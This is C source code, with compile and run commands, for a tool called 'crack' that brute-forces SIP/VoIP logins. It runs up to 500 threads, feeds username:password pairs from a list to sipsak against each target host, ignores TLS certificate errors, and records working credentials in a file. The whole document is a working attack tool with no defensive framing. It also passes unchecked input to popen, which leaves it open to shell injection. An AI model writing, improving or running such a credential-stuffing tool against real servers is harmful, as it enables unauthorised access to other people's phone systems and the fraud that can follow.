gcc -o crack crack.c -lpthread
./crack

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#define MAX_LINE 512
#define MAX_THREADS 500  // Number of targets to be processed simultaneously
#define COMMAND_SIZE 4096  // Increase the size of the command buffer
#define MAX_CREDENTIALS 1000  // Maximum number of username:password pairs

typedef struct {
    char target[MAX_LINE];
    char credentials[MAX_CREDENTIALS][MAX_LINE];
    int num_credentials;
} ThreadData;

void *try_login(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    char command[COMMAND_SIZE];
    char output[COMMAND_SIZE];

    for (int i = 0; i < data->num_credentials; i++) {
        char *username = strtok(data->credentials[i], ":");
        char *password = strtok(NULL, ":");

        snprintf(command, sizeof(command), "sipsak -U -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E tls --tls-ignore-cert-failure 2>&1",
                 username, username, data->target, username, password, data->target, username, data->target);

        FILE *cmd_output = popen(command, "r");
        if (cmd_output) {
            while (fgets(output, sizeof(output), cmd_output)) {
                if (strstr(output, "SIP/2.0 200 OK") || strstr(output, "SIP/2.0 202 Accepted")) {
                    FILE *success_log = fopen("successful_logins.txt", "a");
                    if (success_log) {
                        fprintf(success_log, "Target: %s, Username: %s, Password: %s\n", data->target, username, password);
                        fclose(success_log);
                    }
                    break;
                }
            }
            pclose(cmd_output);
        }
    }

    free(data);
    return NULL;
}

int main() {
    FILE *targets = fopen("targets.txt", "r");
    char target_line[MAX_LINE];

    if (!targets) {
        perror("Failed to open targets file");
        return 1;
    }

    char credentials[MAX_CREDENTIALS][MAX_LINE];
    int num_credentials = 0;
    FILE *credentials_file = fopen("credentials.txt", "r");
    if (!credentials_file) {
        perror("Failed to open credentials file");
        fclose(targets);
        return 1;
    }
    while (fgets(credentials[num_credentials], sizeof(credentials[num_credentials]), credentials_file) && num_credentials < MAX_CREDENTIALS) {
        strtok(credentials[num_credentials], "\n");  // Remove newline
        num_credentials++;
    }
    fclose(credentials_file);

    pthread_t threads[MAX_THREADS];
    int current_thread = 0;

    while (fgets(target_line, sizeof(target_line), targets)) {
        strtok(target_line, "\n");  // Remove newline

        ThreadData *data = malloc(sizeof(ThreadData));
        strncpy(data->target, target_line, sizeof(data->target) - 1);
        data->num_credentials = num_credentials;
        for (int i = 0; i < num_credentials; i++) {
            strncpy(data->credentials[i], credentials[i], sizeof(data->credentials[i]) - 1);
        }

        pthread_create(&threads[current_thread], NULL, try_login, data);
        current_thread++;

        if (current_thread >= MAX_THREADS) {
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_join(threads[i], NULL);
            }
            current_thread = 0;
        }
    }

    // Join any remaining threads
    for (int i = 0; i < current_thread; i++) {
        pthread_join(threads[i], NULL);
    }

    fclose(targets);
    return 0;
}
